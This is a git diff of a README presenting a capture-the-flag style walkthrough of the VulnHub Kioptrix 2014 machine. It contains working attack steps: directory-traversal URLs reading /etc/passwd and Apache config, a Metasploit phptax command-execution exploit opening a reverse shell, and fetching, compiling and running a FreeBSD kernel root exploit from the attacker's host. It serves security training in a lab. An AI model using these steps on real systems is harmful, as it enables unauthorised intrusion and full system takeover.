@@ -1,158 +1,366 @@
-# -Kioptrix-2014-Walkthrough
-Kioptrix 2014 is a vulnerable FreeBSD-based machine from VulnHub. The objective of this assessment was to gain root access through enumeration, web exploitation, and privilege escalation.
+# Kioptrix 2014 | VulnHub Walkthrough
+
+> **Platform:** VulnHub  
+> **Difficulty:** Beginner → Intermediate  
+> **Goal:** Get Root  
 
 ---
 
-## 🎯 Target Discovery
+Welcome to my walkthrough of the **Kioptrix 2014** vulnerable machine! As part of my journey in ethical hacking and cybersecurity, I tackled this machine to sharpen my skills in penetration testing and vulnerability assessment. Kioptrix 2014 is designed to simulate real-world vulnerabilities, making it a valuable learning resource for both aspiring and experienced security professionals.
 
-The first step was to identify the target machine on the local network using Netdiscover.
+In this guide, I'll walk you through every step I took to identify and exploit the vulnerabilities — with detailed explanations along the way. Whether you're preparing for certifications like CEH or OSCP, or simply want to level up your skills, this walkthrough has you covered. Let's dive in! 🚀
+
+---
+
+## Step 1 — Discovering the Target IP
+
+After booting up the Kioptrix machine, the first thing I did was use the `netdiscover` command to find its IP address on the network.
 
 ```bash
-sudo netdiscover
+netdiscover -r 192.168.1.0/24
+```
 
-📸 Screenshot: netdiscover.png
+This scanned my local subnet and returned the target machine's IP address — **192.168.1.123** (yours may differ depending on your setup).
 
-The target machine was discovered at:
+---
 
-192.168.0.123
-🔍 Port Enumeration
+## Step 2 — Port Scanning with Nmap
 
-After identifying the target IP address, an aggressive Nmap scan was performed to enumerate open ports, running services, and version information.
+Now that I had the IP, I ran an **aggressive scan** using Nmap to identify open ports and the services running on them.
 
-nmap -A 192.168.0.123
+```bash
+nmap -A 192.168.1.123
+```
 
-📸 Screenshot: nmap-scan.png
+**What is an Aggressive Scan?**
 
-Open Ports
-Port	Service
-22	SSH
-80	HTTP
-8080	HTTP
+The `-A` flag enables OS detection, version detection, script scanning, and traceroute all in one go. It gives a comprehensive picture of what the target is running.
 
-The presence of two web services made web enumeration the primary focus.
+**Results:**
 
-🌐 Web Enumeration
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH
+80/tcp   open  http    Apache httpd
+8080/tcp open  http    Apache httpd
+```
 
-Accessing port 8080 returned a 403 Forbidden response.
+Three ports were open:
+- **Port 22** — SSH
+- **Port 80** — HTTP (web server)
+- **Port 8080** — HTTP (another web instance)
 
-📸 Screenshot: 403-forbidden.png
+Since HTTP is running on both ports, let's check the web pages.
 
-While reviewing the page source code, a reference to pChart 2.1.3 was discovered.
+---
 
-📸 Screenshot: page-source.png
+## Step 3 — Web Enumeration
 
-Research revealed that pChart 2.1.3 contains a Directory Traversal vulnerability.
+### Port 80
 
-💥 Exploiting pChart
+Opening `http://192.168.1.123` in the browser showed a basic default page — nothing interesting at first glance.
 
-The following payload was used to read local files from the target system:
+But before giving up, I always check the **page source code**. And there it was — a commented-out URL pointing to a **pChart** directory.
 
-http://192.168.0.123/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd
+```
+/pChart2.1.3/examples/index.php
+```
 
-📸 Screenshot: pchart-traversal.png
+**What is pChart?**
 
-The vulnerability was then leveraged to access the Apache configuration file:
+pChart is a PHP-based charting library used to create charts and graphs for web applications. The examples directory was left exposed — a classic misconfiguration.
 
-http://192.168.0.123/pChart2.1.3/examples/index.php?Action=View&Script=/../../usr/local/etc/apache22/httpd.conf
+Navigating to the URL showed a PHP application file listing.
 
-📸 Screenshot: apache-config.png
+### Port 8080
 
-Reviewing the configuration revealed that access was restricted based on the User-Agent header.
+Opening `http://192.168.1.123:8080` returned a **403 Forbidden** error.
 
-🕷️ Bypassing the User-Agent Restriction
+Interesting. Something is blocking access here. We'll come back to this.
 
-To verify the restriction, the request was intercepted using Burp Suite.
+---
 
-The original request contained:
+## Step 4 — Exploiting pChart 2.1.3 — Directory Traversal
 
-User-Agent: Mozilla/5.0
+I searched for known vulnerabilities in pChart 2.1.3 and found it on **Exploit-DB** — there are two exploits:
 
-📸 Screenshot: burp-capture.png
+1. **Directory Traversal**
+2. XSS
 
-The User-Agent header was modified to:
+XSS wouldn't be useful here, so I went with the **Directory Traversal**.
 
-User-Agent: Mozilla/4.0
+**Why Directory Traversal?**
 
-📸 Screenshot: burp-modified.png
+The flaw in pChart allows an attacker to read sensitive files outside the web root. The server executes pChart with elevated privileges, meaning we can access files like `/etc/passwd`, config files, and more — all by manipulating the `Script` URL parameter.
 
-After forwarding the modified request, access to the restricted application was granted.
+**Payload:**
 
-📸 Screenshot: phptax-access.png
+```
+http://192.168.1.123/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
+```
 
-🚀 Initial Access
+**URL Decoded:** `Script=../../etc/passwd`
 
-A known vulnerability affecting PHPTax was identified and exploited using Metasploit.
+The `%2f` is URL encoding for `/`. By chaining `../` sequences, we navigate up the directory tree and reach `/etc/passwd`.
 
+This returned the contents of the passwd file — confirming the vulnerability. ✅
+
+---
+
+## Step 5 — Reading the Apache Config
+
+Now I needed to understand **why port 8080 was returning 403**. The answer would be in the Apache configuration file.
+
+Using the same Directory Traversal trick, I read the Apache config:
+
+```
+http://192.168.1.123/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
+```
+
+Inside the config, I found this line:
+
+```
+SetEnvIf User-Agent "^Mozilla/4\.0" allow_8080
+Order Deny,Allow
+Deny from all
+Allow from env=allow_8080
+```
+
+**The reason for 403:** Port 8080 only allows connections from browsers with a **Mozilla/4.0 User-Agent**. Since modern browsers use different User-Agent strings, we get blocked.
+
+---
+
+## Step 6 — Bypassing the User-Agent Restriction
+
+To access port 8080, I needed to change my browser's User-Agent to `Mozilla/4.0`.
+
+I installed a **User-Agent Switcher** browser plugin and set the User-Agent to:
+
+```
+Mozilla/4.0
+```
+
+After refreshing `http://192.168.1.123:8080/` — it worked! I could now see a directory listing with a folder named **phptax**.
+
+**What is phptax?**
+
+PHPTax is an open-source PHP web application for tax calculations. It's old and unmaintained — perfect conditions for vulnerabilities.
+
+---
+
+## Step 7 — Exploiting phptax — Remote Code Execution
+
+I searched for phptax exploits and found one available directly in **Metasploit**.
+
+Let's fire up msfconsole:
+
+```bash
 msfconsole
-search phptax
+```
 
-📸 Screenshot: msf-search.png
+Search for the exploit:
 
-After configuring the exploit and specifying the required User-Agent, a reverse shell was obtained.
+```bash
+msf > search phptax
+```
 
-📸 Screenshot: exploit-options.png
+Use the exploit:
 
-📸 Screenshot: reverse-shell.png
+```bash
+msf > use exploit/multi/http/phptax_exec
+```
 
-Verifying access:
+Set the required options:
 
-whoami
+```bash
+msf > set LHOST 192.168.1.100    # Your Kali IP
+msf > set LPORT 4444
+msf > set RHOSTS 192.168.1.123   # Target IP
+msf > set RPORT 8080
+```
 
-Output:
+**Important — Set the User-Agent:**
 
+Since the server only accepts Mozilla/4.0, we must set it in the exploit too, otherwise it won't work:
+
+```bash
+msf > set HttpUserAgent Mozilla/4.0
+```
+
+Now select the right payload:
+
+```bash
+msf > show payloads
+msf > set payload cmd/unix/reverse
+```
+
+Run the exploit:
+
+```bash
+msf > run
+```
+
+**Result:**
+
+```
+[*] Started reverse TCP handler on 192.168.1.100:4444
+[*] Sending request...
+[*] Command shell session 1 opened
+```
+
+We have a shell! Let's verify:
+
+```bash
+$ whoami
 www
-⬆️ Privilege Escalation
+```
 
-System enumeration identified the target operating system as FreeBSD.
+We're in as the `www` user. Time for privilege escalation. 🔼
 
-uname -a
+---
 
-📸 Screenshot: uname-output.png
+## Step 8 — Post-Exploitation & Privilege Escalation
 
-A suitable local privilege escalation exploit was identified using Searchsploit.
+### Check the Kernel
 
-searchsploit freebsd local
+```bash
+$ uname -a
+FreeBSD kioptrix2014 9.0-RELEASE
+```
 
-📸 Screenshot: searchsploit-result.png
+**What is uname -a?**
 
-The exploit was copied, transferred, compiled, and executed.
+The `uname -a` command reveals detailed system information — including the **kernel name and version**. This is crucial for finding local privilege escalation exploits.
 
-gcc 28718.c -o ex
-chmod +x ex
-./ex
+The target is running **FreeBSD 9.0** — which has a known local privilege escalation vulnerability.
 
-📸 Screenshot: exploit-transfer.png
+### Find the Exploit
 
-📸 Screenshot: gcc-compile.png
+On Kali (in a new terminal), I searched for FreeBSD exploits:
 
-📸 Screenshot: exploit-execution.png
+```bash
+searchsploit FreeBSD 9.0 privilege escalation
+```
 
-👑 Root Access
+Found it — **28718.c** — Intel SYSRET Kernel Privilege Escalation (CVE-2012-0217).
 
-After executing the exploit:
+### Transfer the Exploit to Target
 
-whoami
+Copy the exploit to a working directory:
 
-Output:
+```bash
+cp /usr/share/exploitdb/exploits/freebsd/local/28718.c ~/Desktop/exploits/
+cd ~/Desktop/exploits/
+```
 
+Host a Python HTTP server:
+
+```bash
+python3 -m http.server 8000
+```
+
+Back in the reverse shell, navigate to `/tmp` and download the exploit:
+
+```bash
+$ cd /tmp
+$ fetch http://192.168.1.100:8000/28718.c
+```
+
+Or use curl/nc if fetch isn't available:
+
+```bash
+$ curl http://192.168.1.100:8000/28718.c -o 28718.c
+```
+
+### Compile and Run
+
+Compile the exploit with `gcc`:
+
+```bash
+$ gcc 28718.c -o privesc
+```
+
+Give it execute permission:
+
+```bash
+$ chmod +x privesc
+```
+
+Run it:
+
+```bash
+$ ./privesc
+```
+
+Check privileges:
+
+```bash
+$ whoami
 root
+```
 
-📸 Screenshot: root-shell.png
+---
 
-🎉 The objective of the machine was successfully completed.
+## 🎉 Root!
 
-🏁 Conclusion
+```
+uid=0(root) gid=0(wheel) groups=0(wheel)
+```
 
-This machine provided hands-on experience with:
+**We are Root!** 🔥
 
-✅ Network Enumeration
-✅ Directory Traversal
-✅ Configuration Disclosure
-✅ User-Agent Bypass
-✅ Remote Code Execution
-✅ FreeBSD Privilege Escalation
+---
 
-Kioptrix 2014 is an excellent lab for practicing web exploitation and privilege escalation techniques in a controlled environment.
+## Root Flag
 
+```bash
+# cat /root/congrats.txt
+```
 
-Ye balance perfect hai bhai — **professional + attractive + GitHub portfolio worthy**. 🔥👨‍💻💀
+```
+If you are reading this, it means you got root (or cheated).
+Congratulations either way :)
+
+Hope you enjoyed Kioptrix VM #5.
+```
+
+---
+
+## Lessons Learned
+
+| # | Lesson |
+|---|--------|
+| 1 | Always check **page source** — the pChart path was hidden in an HTML comment |
+| 2 | **LFI/Directory Traversal** can expose server configs and sensitive files |
+| 3 | **User-Agent filtering is not real security** — it's trivially bypassed |
+| 4 | Outdated web apps like phptax have **public RCE exploits** |
+| 5 | Always run `uname -a` — kernel version often leads to local privesc |
+| 6 | **Enumerate all ports** — port 8080 was the real entry point |
+
+---
+
+## Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `netdiscover` | Host discovery |
+| `nmap -A` | Aggressive port & service scan |
+| `Browser + UA Switcher` | Bypass User-Agent restriction |
+| `Metasploit (msfconsole)` | phptax RCE exploitation |
+| `searchsploit` | Finding local privesc exploit |
+| `python3 -m http.server` | Hosting exploit file |
+| `gcc` | Compiling C exploit on target |
+| `chmod` | Setting execute permissions |
+
+---
+
+## References
+
+- [VulnHub — Kioptrix 2014](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
+- [Exploit-DB — pChart Directory Traversal](https://www.exploit-db.com/exploits/31173)
+- [Exploit-DB — phptax RCE](https://www.exploit-db.com/exploits/21665)
+- [Exploit-DB — FreeBSD 9.0 LPE (28718)](https://www.exploit-db.com/exploits/28718)
+
+---
+
+<p align="center">Made with ❤️ | Happy Hacking 🐱‍💻</p>
